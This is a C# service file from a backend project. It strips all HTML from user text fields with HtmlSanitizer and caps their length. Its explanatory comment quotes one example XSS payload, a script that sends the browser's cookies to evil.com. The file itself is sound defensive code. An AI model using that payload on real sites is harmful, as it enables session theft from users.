using Ganss.Xss;

namespace JsbaiBackend.Services;

/// <summary>
/// Sanitises all text inputs before saving to the database.
///
/// WHY THIS MATTERS:
/// Without sanitisation, someone could submit text like:
///   Title: <script>window.location='http://evil.com?cookie='+document.cookie</script>
///
/// If this text is ever displayed in a browser, the script would run.
/// This is called a Cross-Site Scripting (XSS) attack.
///
/// HtmlSanitizer strips all HTML tags and dangerous content,
/// leaving only plain safe text.
/// </summary>
public interface ISanitizationService
{
    string Sanitize(string? input);
    string SanitizeShort(string? input, int maxLength = 500);
    string SanitizeLong(string? input, int maxLength = 5000);
}

public class SanitizationService : ISanitizationService
{
    private readonly HtmlSanitizer _sanitizer;

    public SanitizationService()
    {
        _sanitizer = new HtmlSanitizer();
        // Allow NO HTML tags — we only want plain text
        _sanitizer.AllowedTags.Clear();
        _sanitizer.AllowedAttributes.Clear();
        _sanitizer.AllowedCssProperties.Clear();
    }

    /// <summary>Basic sanitise — strips all HTML and trims whitespace</summary>
    public string Sanitize(string? input)
    {
        if (string.IsNullOrWhiteSpace(input)) return string.Empty;
        return _sanitizer.Sanitize(input.Trim());
    }

    /// <summary>For short fields like names, titles — also enforces max length</summary>
    public string SanitizeShort(string? input, int maxLength = 500)
    {
        var clean = Sanitize(input);
        return clean.Length > maxLength ? clean[..maxLength] : clean;
    }

    /// <summary>For long fields like abstracts — higher length limit</summary>
    public string SanitizeLong(string? input, int maxLength = 5000)
    {
        var clean = Sanitize(input);
        return clean.Length > maxLength ? clean[..maxLength] : clean;
    }
}
